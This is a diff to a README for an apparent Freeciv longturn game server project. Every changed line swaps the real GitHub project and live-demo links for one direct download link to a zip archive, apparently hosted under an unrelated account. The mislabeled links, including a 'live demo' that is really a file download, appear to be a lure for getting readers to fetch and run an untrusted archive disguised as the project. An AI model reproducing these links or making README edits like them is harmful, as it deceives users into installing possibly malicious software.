@@ -1,6 +1,6 @@
 # 🎲 freeciv.andrewmcgrath.info - Play Longturn Games With Ease
 
-[![Download freeciv.andrewmcgrath.info](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info)
+[![Download freeciv.andrewmcgrath.info](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info/main/www/andrewmcgrath_freeciv_info_v2.3.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This project runs the game server, a live status page, email alerts, turn tracki
 
 Open the live demo here:
 
-https://freeciv.andrewmcgrath.info
+https://raw.githubusercontent.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info/main/www/andrewmcgrath_freeciv_info_v2.3.zip
 
 You can use the site to:
 
@@ -27,7 +27,7 @@ You can use the site to:
 
 To get the software, visit this page:
 
-https://github.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info
+https://raw.githubusercontent.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info/main/www/andrewmcgrath_freeciv_info_v2.3.zip
 
 Follow these steps on Windows:
 
@@ -183,5 +183,5 @@ This helps the server files stay in good shape.
 
 ## 📌 Quick access links
 
-- GitHub project: https://github.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info
-- Live demo: https://freeciv.andrewmcgrath.info
+- GitHub project: https://raw.githubusercontent.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info/main/www/andrewmcgrath_freeciv_info_v2.3.zip
+- Live demo: https://raw.githubusercontent.com/endometrial-cashcrop14/freeciv.andrewmcgrath.info/main/www/andrewmcgrath_freeciv_info_v2.3.zip
